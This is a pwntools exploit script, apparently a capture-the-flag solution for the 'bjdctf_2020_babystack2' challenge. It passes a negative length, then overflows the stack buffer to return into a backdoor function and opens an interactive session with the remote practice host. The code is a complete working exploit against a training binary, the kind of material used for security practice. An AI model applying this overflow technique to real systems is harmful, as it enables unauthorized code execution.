# coding:utf-8

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

#p = process('bjdctf_2020_babystack2')
p = remote('node3.buuoj.cn', 28168)
elf = ELF('bjdctf_2020_babystack2')

padding = 'a' * 0x10
fake_ebp = 'k1ose2jo'
back_door = 0x0400726
payload = padding + fake_ebp + p64(back_door)

p.sendlineafter('name:\n', '-1')
p.sendlineafter('name?\n', payload)

p.interactive()
